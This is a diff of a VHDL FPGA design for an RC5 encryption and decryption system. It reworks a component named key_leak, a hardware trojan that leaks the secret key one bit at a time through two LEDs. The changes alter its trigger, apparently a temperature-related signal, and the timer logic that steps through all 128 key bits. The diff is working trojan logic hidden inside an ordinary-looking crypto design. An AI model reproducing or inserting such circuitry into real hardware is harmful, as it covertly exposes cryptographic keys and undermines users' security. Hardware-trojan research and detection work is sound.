@@ -128,7 +128,7 @@ constant RESET_CNTR_MAX : std_logic_vector(17 downto 0) := "110000110101000000";
 --This is used to determine when the 7-segment display should be
 --incremented
 signal Cntr : std_logic_vector(26 downto 0) := (others => '0');
-signal timer: std_logic_vector(6 downto 0):= (others => '0');
+signal timer: std_logic_vector(5 downto 0):= (others => '0');
 --This counter keeps track of which number is currently being displayed
 --on the 7-segment.
 signal Val : std_logic_vector(3 downto 0) := (others => '0');
@@ -148,12 +148,13 @@ signal cntr_trig: std_logic;
 SIGNAL digit : integer range 0 to 128;
 --signal key_lk_trigger:std_logic;
 Begin	
-	trigger <= not tmp_int;	
+	--trigger <= not tmp_int; remove comment when testing with temperature
+		trigger <= tmp_int;
 --Port Maps
 	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
 	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, trigger => trigger, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
 	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
-	U4 : key_leak Port Map (clr, clk, cntr_trig, trigger, key(digit), led_trojan1, led_trojan0);
+	U4 : key_leak Port Map (clr => clr, clk => clk, counter=>cntr_trig, trojan_trigger=>trigger, leak_key=>key(digit), ready1=>led_trojan1, ready0=>led_trojan0);
 --Select
 	With j_count select
 		hexval <= 	key(31 downto 0) 		when "000",
@@ -272,25 +273,26 @@ begin
 			Val <= (others => '0');
 			enc_trig <= '0';
 		elsif (Cntr = CNTR_MAX) then
-			if(timer=b"0110001")then
-				cntr_trig <= '1';
-				digit<= digit+1;
-				
-			else
-				timer <= timer + b"0000001";
-			end if;
 			if (Val = VAL_MAX) then
 				Val <= (others => '0');
 				enc_trig<='1';
+					if(timer=b"011001")then
+						timer <= b"000000";
+						digit<= digit+1;
+					else
+						cntr_trig <= '0';
+						timer <= timer + b"000001";
+					end if;
+					if(timer(4)='1') then
+						cntr_trig <= '0';
+					else
+						cntr_trig <= '1';
+					end if;
 			else
 				Val <= Val + 1;
 				enc_trig <='0';
 			end if;
 		else
-			if(timer <= b"1100010")then
-				cntr_trig <= '0';
-				timer <= b"0000000";
-			end if;
 			enc_trig<='0';
 			if(digit = 128)then
 				digit <= 0;
